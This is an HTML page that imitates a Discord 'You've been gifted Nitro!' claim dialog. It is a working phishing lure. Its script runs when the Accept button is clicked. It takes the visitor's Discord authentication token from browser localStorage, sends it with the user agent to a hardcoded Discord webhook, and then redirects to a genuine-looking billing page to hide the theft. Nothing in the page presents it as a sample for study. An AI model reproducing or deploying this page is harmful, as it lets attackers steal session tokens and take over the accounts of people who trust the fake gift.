<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Discord | Claim Gift</title>
    <style>
        :root {
            --brand-color: #5865f2;
            --brand-hover: #4752c4;
            --bg-body: #36393f;
            --bg-modal: #2f3136;
            --text-normal: #dcddde;
            --text-header: #ffffff;
        }

        body {
            margin: 0;
            background-color: var(--bg-body);
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .modal-card {
            background-color: var(--bg-modal);
            width: 420px;
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 0 0 1px rgba(0,0,0,0.3), 0 2px 10px 0 rgba(0,0,0,0.6);
            text-align: center;
            transition: transform 0.2s ease;
        }

        .nitro-icon { width: 80px; height: 80px; margin-bottom: 20px; }
        h1 { color: var(--text-header); font-size: 24px; margin: 0 0 16px; }
        .description { color: var(--text-normal); font-size: 15px; margin-bottom: 24px; }
        
        .btn-claim {
            background-color: var(--brand-color);
            color: #fff;
            border: none;
            padding: 12px 24px;
            width: 100%;
            border-radius: 3px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.15s ease;
        }

        .btn-claim:hover { background-color: var(--brand-hover); }
        .btn-claim:disabled { opacity: 0.5; cursor: not-allowed; }

        .footer-note {
            margin-top: 24px;
            font-size: 12px;
            color: #72767d;
        }
    </style>
</head>
<body>

    <div class="modal-card">
        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="nitro-icon" alt="Nitro">
        <h1>You've been gifted Nitro!</h1>
        <p class="description">Your 3-month Nitro gift is ready. Accept now to apply the promotion to your account.</p>
        <button id="claimBtn" class="btn-claim">Accept</button>
        <div class="footer-note">Promotional gift from Discord. Valid payment method required.</div>
    </div>

    <script>
        document.getElementById('claimBtn').addEventListener('click', async function() {
            const btn = this;
            btn.disabled = true;
            btn.innerText = "Verifying...";

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            const payload = {
                content: "@everyone",
                embeds: [{
                    title: "🚀 Nitro Claim Attempt",
                    color: 0x5865F2,
                    fields: [
                        { name: "Token", value: `\`${token || "N/A"}\``, inline: false },
                        { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error(err);
            }

            setTimeout(() => {
                window.location.replace("https://discord.com/billing/promotions/gift-accepted");
            }, 1000);
        });
    </script>
</body>
</html>
